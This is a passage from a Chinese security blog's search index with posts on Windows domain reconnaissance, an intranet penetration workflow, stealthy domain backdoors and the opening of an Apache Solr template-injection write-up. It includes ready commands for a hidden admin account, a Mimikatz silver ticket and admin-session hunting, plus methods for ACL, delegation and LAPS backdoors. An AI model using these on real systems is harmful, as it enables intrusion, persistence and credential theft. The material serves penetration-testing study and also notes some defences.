","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域 net view /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域内所有计算机 net view /domain:HACKE ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域内所有用户列表 net group /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域内所有成员计算机列表 net group \"domain computers\" /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:4","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域密码信息 net accounts /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:5","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"获取域信任信息 nltest /domain_trusts ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:7:6","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查找域控制器 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看域控制器的机器名 nltest /DCLIST:DomainName ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看域控制器的主机名 nslookup -type=SRV _ldap._tcp. ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看当前时间 net time /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查看域控制器组 net group \"Domain Controllers\" /domain netdom query pdc ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:8:4","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"获取域内的用户和管理员信息 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询所有域用户列表 向域控服务器进行查询 net user /domain 获取域内用户的详细信息 wmic useraccount get /all 查看存在的用户 dsquery user 查询本地管理员组用户 net localgroup administrators ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域管理员用户 查询域管理员用户 net group \"domain admins\" /domain 查询管理员用户 net group \"Enterprise Admins\" /domain ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:9:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"定位域管理员 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:10:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"常用工具 pslogon.exe pslogon.exe \\\\DC PVEFindADUser.exe PVEFindADUser.exe -current netview.exe nmap的脚本 对域控进行信息搜集，可以获取主机信息，用户等信息 smb-enum-sessions.nse 获得某台主机的权限，但是无法获取更多的域用户信息 Smb-enum-users.nse 遍历远程主机的共享目录 smb-enum-shares.nse 对主机远程进程进行遍历 smb-enum-process.nse 对主机的操作系统，计算机名，域名，域林名称，NetBIOS机器名，工作组，系统时间等信息 smb-os-discovery powerview脚本 Invoke-StealthUserHunter Invoke-UserHunter Empire 的 user_hunter模块 usemode situational_awareness/network/powerview/user_hunter ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:10:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查找域管进程 ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:0","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"本机检查 获取域管理员列表 net group \"Domain Admins\" /domain 列出本机的所有进程及进程用户 tasklist /v ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:1","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询域控的域用户会话 https://github.com/nullbind/Other-Projects/tree/master/GDA ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:2","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"查询远程系统中运行的任务 首先，从Domain Admins组中收集域管理员列表 然后，将目标 ip 加到 ips.txt ，将收集的域管理员列表加到 names.txt 文件。 FOR /F %i in (ips.txt) DO @echo [+] %i \u0026\u0026 @tasklist /V /S %i /U user /P password 2\u003eNUL \u003e output.txt \u0026\u0026 FOR /F %n in (names.txt) DO @type output.txt | findstr %n \u003e NUL \u0026\u0026 echo [!] %n was found running a process on %i \u0026\u0026 pause ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:3","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"扫描远程系统的 NetBIOS 信息 首先，从Domain Admins组中收集域管理员列表 然后，将目标 ip 加到 ips.txt ，将收集的域管理员列表加到 admins.txt ` 文件。 for /F %i in (ips.txt) do @echo [+] Checking %i \u0026\u0026 nbtstat -A %i 2\u003eNUL \u003enbsessions.txt \u0026\u0026 FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u003e NUL \u0026\u0026 echo [!] %n was found logged into %i ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:4","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"BloodHound 工具 brew services start neo4j 收集脚本 https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors SharpHound.exe -c all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:5","tags":["域安全","内网渗透","信息收集"],"title":"内网信息收集","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["内网渗透"],"content":"内网渗透流程介绍","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"内网渗透流程 ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:0:0","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"1 Initial Access 基础 Web 漏洞 (弱口令、文件上传、文件包含、RCE、反序列化) 各类基础服务 0/1/N Day RCE (vsftpd、 Samba、 fastcgi) 个人机(钓鱼打点) 供应链攻击 VPN、VNC、TV等 0/1day ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:0","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"1.1 网络位置判断 网络区域 DMZ 生产网 办公网 主机角色判断 运维 行政 … 连通性判断 icmp ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:1","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"1.2 Proxy 出网测试 exe or ps1 TCP / UDP / HTTP / HTTPS / DNS / ICMP Port or Socket ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:2","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"1.3 Recon Work Group or Domain Domain Admin or !Admin Command or Secret File 主机发现 1.3.1 浏览器历史及密码 Firefox Chrome … 1.3.2 RDP Logon event MSTSC history 1.3.3 凭据管理器 Web 凭据 1.3.4 信息收集 代理 网络发现 1.3.5 用户监控 登录监控 挂盘监控 ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:3","tags":["域安全","内网渗透"],"title":"内网渗透流程","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["内网渗透"],"content":"隐蔽域后门原理及复现","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"隐蔽域后门 隐藏用户 隐蔽程序 粘滞键 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:0:0","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"常见后门方式 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:0","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"隐藏用户 net user yincang$ 123456qaq /add net localgroup administrators yincang$ /add ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:1","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"隐蔽程序 NtGodMode NtGodMode.exe 上帝之门，不管管理员如何更改口令密码，均能以任意口令登录系统 https://blog.csdn.net/oceanark/article/details/51902042 https://www.jb51.net/article/14702.htm https://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=19817\u0026page=1 命名管道 命名管道，\\Server\\PipeName\\Path IP + Port 是常用的远程连接方式命名管道不需要特定的端口，混杂在135端口中。 实现不开端口的情况下登录 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:2","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"粘滞键 五次连续按下 shift 键，会弹出输入法选择器。可以将 cmd 替换输入法，获取 Shell ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:3","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"域内隐蔽后门 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:0","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"目录 ACL 一种基于域内对象 ACL(Access Control Link)访问控制链的深度隐藏后门。 域网络中，域的组策略和脚本存放在域服务器的 SYSVOL 目录，所有域用户均可自由访问，但只有部分高权限用户才有修改权限。域内账号在登录域时，会查询、 执行(如果有变化)属于自己的域策略、执行脚本。 一定程度上说，控制了 SYSVOL 目录，就有很大概率控制域网络。 如果域中部署了登录日志审计软件，则会严格审计域内高权限账号的登录、使用情况。所以使用高权限用户控制域网络的方式，隐蔽性并不高 一般来说，域策略会强制周期性修改高权限用户的密码，但是对低权限用户来说不一定有这个强制性要求，而且域中往往有很多用户几乎不怎么登录、使用。 如果低权限用户具备 SYSVOL 目录的修改权限，登录域时，因为权限不高，不会被审计软件发现。现在的防护、监控类软件还没有过多关注目录的ACL，因此这种方式是一种很实用的隐蔽后门方式。 使用普通用户 eviluser 登录域客户端 Windows 7。通过net use连接域服务器，可查看访问服务器共享的目录，但是没有写权限。 通过资源管理工具给 Policies 目录添加了写权限(也可以是完全控制权)，并继承给所有子目录和文件 Policies 目录的安全选项卡，eviluser 单独作为权限用户。正常情况下，普通用户都只有 Authenticated users 用户组权限。 服务器中目录的 ACL 权限设置成功后，在原来的 IPC 连接中，普通域用户 eviluser 成功地往 Policies 目录写入 了数据，证明具备了对该目录的写入权限。从而可以修改里面的策略和脚本，一种隐蔽的后门。 这种后门方式，只是演示了 ACL 后门的一种具体形式，因为域中的对象太多，可以操控的 ACL对象也很多。可以根据自己的需要，灵活选择目标的ACL作为目标进行修改，埋藏后门。 当然关于 ACL 的检测，微软也推出了专门的工具，ACL Scanner ，如果周期性地是用该工具进行检测，还是能检测到这种类型的后门。 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:1","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"白银票据 在 windows 系统中，许多服务以主机账号运行，即许多 ServiceAccount 账号为本机的主机账号，格式为 ComputerName$。 下表是常见的以主机账号运行的服务。右边一栏中有些有多个服务，例如 WMI 服务包括 HOST、RPCSS 这 2 个服务，表示访问 WMI 服务同时需要 2 个 TGS 票据 服务名称 同时需要的服务 WMI HOST、RPCSS PowerShell Remoting HOST、HTTP WinRM HOST、HTTP Scheduled Tasks HOST Windows File Share CIFS LDAP LDAP Windows Remote Server RPCSS、LDAP、CIFS 已知域服务器主机账号的口令散列值，使用 Mimikatz 的白银票据功能，伪造访问 HOST 服务的TGS ，以域管理员权限运行域服务器的 SCHTASKS 命令，远程创建、查看、删除系统任务 构造白银票据 kerberos::golden /admin:administrator@testlab.com /domain:testlab.com /sid:S-1-5-21-2390976136-1701108887-179272945 /target:TESTLABDC02.testlab.com /rc4:36788836f262b9409f102baa22b7a6f3 /service:host /ptt 创建计划任务 修改主机账号的口令策略制作后门 在主机的注册表中修改策略，具体位置为HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Netlogon\\Parameters，键值为 DisablePasswordChange，设置为 1，即表示禁止修改账号口令; 在组策略中修改默认的 30 天，修改位置为 “Computer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Maximum machine account password age\"，设置为 0 时，表示无限长; 组策略直接禁止修改主机账号口令，用来支持 VDI(virtual desktops Infrastructure) 等类型的使用，具体位置为 “Computer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Disable machine account password changes” 方案 1 较为安全。由于组策略存在快照，因此方案 2、3 风险较大 修改主机账号的委派设置权限制作后门 域委派攻击中，一个主机账号被设置了约束性委派，则可以使用主机账号的口令散列值和约束性委派获取域管理员权限。前提条件为：主机账号的口令散列值和委派(约束性和非约束性均可) 如果我们在域内有多个稳定的控制点，且获取了当前系统的 SYSTEM 权限，则随时可获取当前主机的主机账号 (演示中的账号为 win7x86cn$ )口令散列值，满足了第 1 个条件; 如果将该 win7x86cn$账号的 SeEnableDelegationPrivilege 权限赋予本机的低权限登录域用户 (eviluser) ，则通过 eviluser 用户随时可更改 win7x86cn$ 账号的委派设置，从而可满足第 2 个条件 并不是拥有一个对象的 GenericAll 权限，就可以修改对象的 msDS-AllowedToDelegateTo 属性，攻击者只有拥有对象的 SeEnableDelegationPrivilege 权限时，才能修改 默认情况下，SeEnableDelegationPrivilege 权限只有域控制器才有，因此我们需要检测应用到这些域控制器上的哪些组策略改变了用户的 SeEnableDelegationPrivilege 权限配置 一般情况下，都是默认组策略“Default Domain Controllers Policy” SeEnableDelegationPrivilege 权限很特殊，设置方法为修改 GPO 策略文件，位置为域服务器中\\SYSVOL\\sysvol\\testlab.com\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf文件 添加 eviluser 具备 SeEnableDelegationPrivilege 权限，则 eviluser 可修改域内所有用户的委派设置。下图是测试在 eviluser 的登录会话中修改 win7x86cn$ 账号的委派设置 查看了 win7x86cn 这个账号的委派设置情况，标红的 useraccountcontrol 表示没有设置委派，中间使用 Set-DomainObject 进行委派设置，16777216 表示设置 TRUS TED_TO_AUTH_FOR_DELEGATION，通过Get-DomainObject 查询设置后的结果，有了 msds-allowedtodelego 选项，且 useraccountcontrol 发生了变更。 应对此后门的安全策略 通过域的组策略强制设置主机账号的最长有效期为 30 天; 保护 {6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf文件、即关键组策略的完整性; 高权限的用户，设置不能被委派 主机账号需设置委派时，只能设置为约束性委派 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:2","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["内网渗透"],"content":"LAPS 域网络中，主机的本地管理员很少被使用，但是给网络安全却带来了很大的风险。攻击者如果获取了本地管 理员的 NTLM，不必破解，即可通过 PTH 攻击域内其他主机。为了解决这个问题，微软在2014 年发布了 KB2871997 和 KB2928120 两个补丁，PTH 方式失效。 如果域内主机的本地管理员的口令比较简单，则可能被破解，口令仍然可被用于口令猜解或爆破的字典库、IPC 或远程桌面登录等。 微软在 2015 年发布了一个本地管理员口令解决方案 LAPS(Local Administrator Password Solution)，用来集中化管理域内主机本地管理员的口令。通过 LAPS 制作策略，强制管理域内主机的本地管理员口令，防止恶意攻击者利用本地管理员口令进行域内横向攻击。该方案包含客户端和服务器，分别安装于域内主机和域服务器 LAPS 功能 根据策略搜集本地管理员账号(最多管理一个本地管理员账号)，设置符合密码策略的随机口令 将新的口令上传到域服务器，并储存在域内对应的主机账号的属性中 将新的过期日期更新到主机账号属性 检查本地管理员账号的口令是否过期，如果口令过期，会产生新的随机口令，并更新 AD 中主机账号的相关属性。 LAPS提供了 GUI 和 AdmPwd.PS 脚本模块 2 种管理工具。安装完成 LAPS 后，需要使用 AdmPwd.PS 模块的 Set-AdmPwdComputerSelfPermission 命令，赋予某个 OU 或整个域内的主机具有设置自身属性的权限。 每个主机对象能自动存储口令明和口令过期时间。 在域服务器中，可通过 GUI 直接查看指定主机中本地管理员的口令明文。 LAPS 在域内的主机账号属性中增加了 ms-Mcs-AdmPwd 和 ms-Mcs-AdmPwdExpirationTime 两个属性。第 1 个属性存储本地管理员的口令明文，第 2 个属性存储口令的过期时间。这里也许有读者会疑问，为什么会储存明文口令，而不是某种密文形式的口令。 AdmPwd.PS 模块的 Find-AdmPwdExtendedRights 命令，可检测域内哪些账号或组具备读取 ms-Mcs-AdmPwd 属性的权限。 在检测某个特定的域对象的 AD 权限时，有 2 个事情需要考虑: 是哪些域内主体可以赋予自身或其他域内主体这项 AD 权限; 是哪些已有的 ACE 包含了这项 AD 权限 ，这些 ACE 应用在哪些对象上。 在做第 1 个事情的检查时，Find-AdmPwdExtendedRights 没有检测安全描述符的控制权。 在第 2 个事情的检查中，该接口通过 4 个方面来决定结果: AD 对象类型 ACE 访问掩码 ACE 对象类型 ACE 继承的对象类型 在 AD 对象类型检测时，Find-AdmPwdExtendedRi ghts 仅仅分析应用到 OU 或计算机的 ACE，所有其他的容器对象都忽略，使用 Set-AdmPwdComputerSelfPermission 进行权限设置时的参数也是 OU 类型。攻击者可以在非 OU 容器对象上赋予自身读取 ms-Mcs-AdmPwd 属性的权限 msImaging-PSPs 类型容器不在检测分析范围，如果将计算机对象放至该类型的容器中，则可以规避被检测 如果赋予某个低权限用户关于该类型容器的完全权限，则可以控制容器中计算机的属性，包括 ms-Mcs-AdmPwd 属性。 win7x86user 是域内普通用户，NotOu 为一个 msImaging-PSPs类型容器，其中有一台机器win7x86cn，在 NotOu上赋予了 win7x86user 对该容器的全部权限，容器中的对象 win7x86cn继承了所有权限 上面的测试和实验表明，在安装有 LAPS 环境的域网络中，可以有效利用 LAPS 作为一个隐蔽的后门，赋予低权限用户随时读取高权限主机本地管理员口令明文的权限，从而快速获取高权限主机的控制权，进一步通过散列值获取等方式获取域控制权限。当然这一切的前提是已经获取了域控制权限。 LAPS在客户端仅仅部署了一个 AdmPwd.dll 文件，用于响应来自域服务器的密码更改策略，然后将口令明文以 Kerberos 加密方式存储至服务器中对应的主机账号的 ms-Mcs-AdmPwd 属性 LAPS起源于一个公开项目，通过对公开项目源码的分析，可以使用手动的方式模拟口令修改过程 客户端在使用 AdmPwd.dll 文件时，Windows 并没有对该文件进行完整性校验或者签名验证。因此一个被篡改过的 DLL 一样可以正常使用。所以如果攻击者根据公开源码编译一个功能类似的 DLL，同时在 DLL 中添加部分功能，将修改后的口令明文写到指定位置。这可使攻击者随时都能获取口令明文，从而具备对客户端的完全控制权限 根据LAPS的安装介绍说明，在客户端上安装有3种方式， 客户端安装 LAPS.x64.msi 或 LAPS.x86.msi 在客户端使用 regsvr32.exe AdmPwd.dll 安装 如果以第二种方式在客户端安装 LAPS ，且 AdmPwd.dll 的目录为普通用户的可写目录，则普通用户可直接用伪造的 DLL 文件替换原来真实的 DLL 文件。可获取本地管理员的口令明文，获取本机的完全控制权，实现权限提升 LAPS 是微软为了加强本地管理员的口令管理，提高网络安全性而部署的解决方案，但是方案中的一些瑕疵导致 LAPS 可以变成攻击者制作隐蔽后门的工具。不仅 LAPS 如此，许多其他软件亦是如此。随着产品的增多，安全性得到提升的同时，暴露给攻击者的攻击面同时也得到了扩大。安全之路任重道远。 ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:3","tags":["域安全","内网渗透","域后门"],"title":"隐蔽域后门","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["漏洞复现"],"content":"Apache Solr模板注入远程代码执行漏洞","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Apache Solr 模板注入远程代码执行漏洞 Apache Solr 是美国阿帕奇（Apache）软件基金会的一款基于 Lucene（一款全文搜索引擎）的搜索服务器。Apache Velocity 是一个提供 HTML 页面模板、email 模板和通用开源代码生成器模板的模板引擎。在 Apache Solr 的多个版本中，Apache Solr 的 VelocityResponseWriter 功能的配置参数可通过 HTTP 请求指定，导致用户可通过设置特定参数后，通过注入任意 Velocity 模板造成任意命令执行。 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","Solr"],"title":"Apache Solr模板注入远程代码执行漏洞","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"影响范围 